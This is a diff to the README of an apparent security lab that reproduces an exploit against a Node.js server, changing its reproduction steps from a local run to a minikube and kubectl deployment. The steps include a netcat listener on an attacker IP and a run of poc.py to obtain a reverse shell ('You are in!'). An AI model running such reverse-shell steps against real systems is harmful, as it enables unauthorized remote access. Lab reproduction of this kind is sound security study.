@@ -10,11 +10,12 @@ Used PoCs:
 
 ### Steps to Reproduce
 
-1- Install requirements \
-2- `npm start` Server starts on port `4242` \
-3- Listen on port `1234` for TCP connections with `nc -l 127.0.0.1 1234` \
-4- Run poc.py \
-5- You are in!
+1- `minikube start` \
+2- `kubectl apply -f scenario-1-server.yaml` \
+3- Forward port `kubectl port-forward pods/scenario-1-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
+4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
+5- Run poc.py with your ip `./poc.py 144.122.139.40` \
+6- You are in!
 
 ### Kubernetes
 Check https://learnk8s.io/deploying-nodejs-kubernetes for deployment tutorial
